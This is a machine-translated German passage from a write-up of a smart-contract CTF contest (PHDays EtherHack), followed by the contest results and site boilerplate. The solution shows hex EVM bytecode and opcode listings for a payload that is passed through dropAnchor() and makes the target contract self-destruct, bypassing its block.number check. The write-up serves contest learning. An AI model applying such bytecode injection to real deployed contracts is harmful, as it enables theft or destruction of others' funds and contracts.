Assembler-Anweisungen direkt <code>dropAnchor()</code> .  Die Hauptschwierigkeit bestand jedoch darin, eine Nutzlast zu erstellen, mit der wir die <code>block.number</code> . <br><br>  In EVM k√∂nnen Sie Vertr√§ge mit der Anweisung create erstellen.  Seine Argumente sind Wert, Eingabeversatz und Eingabegr√∂√üe.  value ist ein Bytecode, der den Vertrag selbst hostet (Initialisierungscode).  In unserem Fall wird der Initialisierungscode + Vertragscode in uint256 abgelegt (danke an das <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">GasToken-</a> Team f√ºr die Idee): <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x6a63004141414310585733ff600052600b6015f3</span></span></code> </pre> <br>  Dabei sind die fettgedruckten Bytes der Code des gehosteten Vertrags und 414141 die Injektionsstelle.  Da wir vor der Aufgabe stehen, den Wurfoperator loszuwerden, m√ºssen wir unseren neuen Vertrag einf√ºgen und den nachfolgenden Teil des Initialisierungscodes neu schreiben.  Versuchen wir, den Vertrag mit der Anweisung 0xff zu versehen, was zur bedingungslosen Entfernung des Ankervertrags mit <code>selfdestruct()</code> : <br><br><pre>  68 414141ff3f3f3f3f3f ;;  push9 Vertrag
 60 00 ;;  push1 0
 52 ;;  mstore
 60 09 ;;  push1 9
 60 17 ;;  push1 17
 f3 ;;  zur√ºck </pre><br>  Wenn wir diese Folge von Bytes in <code>uint256 (9081882833248973872855737642440582850680819)</code> und als Argument f√ºr die Funktion <code>dropAnchor()</code> verwenden, erhalten wir den folgenden Wert f√ºr die <code>dropAnchor()</code> (der fettgedruckte Bytecode ist unsere Nutzlast): <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x630068414141ff3f3f3f3f3f60005260096017f34310585733ff</span></span></code> </pre> <br>  Nachdem die Codevariable Teil der Initcodevariablen geworden ist, erhalten wir den folgenden Wert: <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x68414141ff3f3f3f3f3f60005260096017f34310585733ff600052600b6015f3</span></span></code> </pre> <br>  Jetzt sind die High-Bytes <code>0x6300</code> weg und der Rest des Bytecodes wird nach <code>0xf3 (return)</code> verworfen. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/433/f75/735/433f757356003d73286fa4709cdedcfd.png" alt="Bild"><br><br>  Als Ergebnis wird ein neuer Vertrag mit der ge√§nderten Logik erstellt: <br><br><pre>  41 ;;  M√ºnzbasis
 41 ;;  M√ºnzbasis
 41 ;;  M√ºnzbasis
 ff ;;  Selbstzerst√∂rung
 3f ;;  M√ºll
 3f ;;  M√ºll
 3f ;;  M√ºll
 3f ;;  M√ºll
 3f ;;  M√ºll </pre><br>  Wenn wir jetzt die Funktion pullAnchor () aufrufen, wird dieser Vertrag sofort zerst√∂rt, da block.number nicht mehr √ºberpr√ºft wird.  Danach rufen wir die Funktion sailAway () auf und feiern den Sieg! <br><br><h2>  Ergebnisse </h2><br><ol><li>  Erster Platz und Ausstrahlung in H√∂he von 1.000 US-Dollar: Alexey Pertsev (p4lex) </li><li>  Zweiter Platz und Ledger Nano S: Alexey Markov </li><li>  Dritter Platz und PHDays Souvenirs: Alexander Vlasov </li></ol><br>  Alle Ergebnisse: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">etherhack.positive.com/#/scoreboard</a> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d88/d86/955/d88d8695572199f7e3d800f34deb18ee.jpg" alt="Bild"><br><br>  Herzlichen Gl√ºckwunsch an die Gewinner und vielen Dank an alle Teilnehmer! <br><br>  PS Vielen Dank an <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Zeppelin</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">, der den</a> Quellcode der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Ethernaut CTF-</a> Plattform Open Source gemacht hat. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de414959/">https://habr.com/ru/post/de414959/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de414945/index.html">Die Johns Hopkins University hat k√ºnstliche Haut geschaffen, die Schmerzen empfindet</a></li>
<li><a href="../de414947/index.html">Git f√ºr Windows unter ReactOS herunterladen</a></li>
<li><a href="../de414951/index.html">Zugriffsverwaltung in Expressjs mit CASL</a></li>
<li><a href="../de414953/index.html">Nvidia brachte dem neuronalen Netzwerk bei, das Video zu verlangsamen</a></li>
<li><a href="../de414955/index.html">Unternehmen verwendeten das Wort Blockchain, um die Kapitalisierung zu erh√∂hen. Hat eine Weile geholfen</a></li>
<li><a href="../de414961/index.html">√úbersicht √ºber SERM</a></li>
<li><a href="../de414963/index.html">Es wurde eine Problemumgehung f√ºr die Umgehung des Kennwortschutzes auf dem iPhone / iPad gefunden. Nicht wirklich</a></li>
<li><a href="../de414965/index.html">‚ÄûUrheberrechtsschutz in der EU‚Äú: Neue Reformen k√∂nnen nicht nur Medienplattformen betreffen</a></li>
<li><a href="../de414967/index.html">So reduzieren Sie die Erstellungszeit eines Projekts mithilfe des Firebase Performance Plugins</a></li>
<li><a href="../de414969/index.html">Erweitern des Erstellungsprozesses mit MSBuild</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>